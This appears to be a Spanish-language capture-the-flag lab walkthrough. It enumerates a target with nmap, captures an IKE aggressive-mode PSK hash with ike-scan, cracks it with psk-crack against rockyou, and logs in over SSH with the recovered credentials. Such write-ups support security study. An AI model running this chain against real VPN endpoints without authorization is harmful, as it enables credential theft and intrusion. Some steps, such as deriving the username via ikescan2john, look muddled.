
## Enumeración
Empezaremos realizando un escaneo con [[NMAP]] en el cual encontramos abierto el puerto `22/tcp` y el puerto `500/udp`
`nmap -sSCV -p- --open --min-rate 5000 -n -Pn -vvv <IP>`
`nmap -sU -p- --open --min-rate 5000 -n -Pn -vvv <IP>`

En el puerto `500` hay un servicio `ISAKMP Internet Security Association and Key Management Protocol`
Usaremos [[IKE-SCAN]] es una utilidad de línea de comandos para descubrir, identificar (fingerprint) y recopilar información de hosts que hablan IKE (Internet Key Exchange)

Ejecutaremos el siguiente comando:
`ike-scan --aggressive --pskcrack=psk.params`
`--aggresive` -> Envía identidades y parámetros en los primeros mensajes, sin esperar un handshake completo.
`--pskcrack` -> Captura el handshake en Aggressive Mode y lo guarda en `psk.params`

Usaremos [[PSK-CRACK]] Su objetivo principal es intentar adivinar la Pre-Shared Key (PSK)
`psk-crack -d /usr/share/wordlists/rockyou.txt psk.params`
Con `-d` seleccionaremos la wordlist y a continuación le pasaremos el archivo generado anteriormente.

Nos devolverá la password,(key):
`key "freakingrockstarontheroad" matches SHA1 hash 9acd999de926d953c088daf7b69efcfdecbd1893`

El hash lo guardamos en un fichero llamado hash.

Y usamos la herramienta de [[JOHN THE RIPPER]] con el siguiente comando:
`ikescan2john hash`

Y descubrimos que hay usuario `ike`

Accedemos a el por SSH con las credenciales `ike::freakingrockstarontheroad`





